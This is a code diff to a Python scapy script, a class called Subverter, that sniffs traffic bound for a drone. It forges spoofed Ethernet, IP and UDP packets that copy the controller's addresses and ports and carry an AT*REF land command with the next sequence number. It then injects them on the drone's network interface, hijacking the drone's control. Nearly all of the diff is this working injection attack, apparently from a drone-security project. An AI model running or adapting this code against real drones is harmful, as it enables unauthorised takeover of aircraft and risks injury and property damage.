@@ -67,45 +67,30 @@ class Subverter(object):
             # currentTime = time.time()
 
             # print('Source: {0}, Dest: {1}'.format(packet[IP].src, packet[IP].dst))
+
             try:
                 if packet[IP].dst != DRONE_IP:
                     return
-                if packet[Raw].load.endswith('290717696'):
+                if packet[Raw].load.startswith('AT*REF'):
+                    print('Skipping land command')
                     return
             except Exception:
                 return
 
+            seqnum = int(packet[0][Raw].load.split('=')[1].split(',')[0])
 
-            # print('Load: {0}'.format(packet[Raw].load))
-            load = packet[Raw].load
-            # seq = int(load.split('=')[1].split(',')[0])
-            # seq = seq + 500
-            # for i in range(seq, seq + 5):
-            forged = packet.copy()
-            # forged[Raw].load = 'AT*REF='+str(seq)+',290717696'
-            forged[Raw].load = 'AT*REF=9999,290717696'
-            del forged[IP].chksum
-            del forged[UDP].chksum
-            print(1)
-            forged.show2()
-            forged = forged.__class__(str(forged))
-            print(2)
-            forged.show()
-            print(3)
-            packet.show()
-
-            sendp(forged)
-
-            # forged.show2()
-
-            # print('Forged Load: {0}'.format(forged[Raw].load))
-
-            # send(forged)
-
-            # forged.show()
+            # print('Original (seq = {0})'.format(seqnum))
             # packet.show()
 
-            # TODO: if it is going to the drone, forge a copy to land
+            for s in range(seqnum+1,seqnum+2):
+                load = 'AT*REF=' + str(s) + ',290717696\r'
+                forged = Ether(dst=packet[0][Ether].dst, src=packet[0][Ether].src)/IP(dst=packet[0][IP].dst, src=packet[0][IP].src)/UDP(sport=packet[0][UDP].sport, dport=packet[0][UDP].dport)/load
+                forged.show2()
+                del forged.chksum 
+                forged = forged.__class__(str(forged))
+                forged.show()
+
+                sendp(forged, iface=DRONE_NET_INTERFACE)
 
         return packetCallback
 
